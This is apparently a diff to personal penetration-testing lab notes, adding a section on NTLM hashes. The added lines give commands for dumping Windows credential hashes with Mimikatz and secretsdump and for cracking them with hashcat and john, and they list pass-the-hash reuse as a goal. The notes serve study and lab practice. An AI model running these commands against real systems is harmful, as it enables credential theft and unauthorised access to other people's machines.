@@ -776,7 +776,42 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
    ssh -i id_rsa -p 2222 dave@192.168.161.201
    ```
 - password hashes  
-  - NTLM  
+  - NTLM
+    - NTLM (NT LAN Manager) is a Windows authentication protocol. Hashes stored in C:\Windows\system32\config\sam. Dumped via lsass.exe, pwdump, Mimikatz
+    - Goals: get plaintext password from NTLM hash > pivot to othe system > reuse credentials (pass-the-hash, RDP, SMB)
+    -  **[Mimikatz](https://github.com/gentilkiwi/mimikatz)** can extract plain-text passwords and password hashes from various sources in Windows and leverage them in further attacks like pass-the-hash (PtH). **Sekurlsa module**, which extracts password hashes from the Local Security Authority Subsystem (LSASS)
+    -  [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec): elevate our privileges to the SYSTEM account
+    - Methodology
+      1. Obtain Hash
+         - mimikatz: sekurlsa::logonpasswords
+         - sass memory dump + pypykatz or mimikatz
+         - SAM + SYSTEM hive extraction
+         - Remote techniques: secretsdump.py from Impacket  
+      3. Format Hash
+         - Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
+      5. Choose Attack Mode
+         - wordlist, brute force, mash attack, rules-based, hybrid  
+      7. Use Cracker
+         - `hashcat -m 1000 -a 0 hash.txt rockyou.txt`
+         - `john --format=NT hash.txt --wordlist=rockyou.txt`
+      9. Analyze Result
+          - hashcat.potfile, ~/.john/john.pot  
+    - Showing all local users in PowerShell
+      `Get-LocalUser`
+    - start C:\tools\mimikatz.exe in PowerShell `.\mimikatz.exe`  
+    - Enabling SeDebugPrivilege, elevating to SYSTEM user privileges and extracting NTLM hashes
+      
+      ```
+      privilege::debug
+      token::elevate
+      lsadump::sam
+      ```
+    - NTLM hash of user nelly in nelly.hash  `nano nelly.hash` 3ae8e5f0ffabb3a627672e1600f1ba10
+    - Hashcat mode for NTLM hashes
+      `hashcat --help | grep -i "ntlm"` >  1000 | NTLM  | Operating System
+    - Crack by using rockyou.txt and best64.rule
+      `hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  
+    - 
   - NTLMv2  
   - relaying NTLMv2  
   - Windows credential guard  
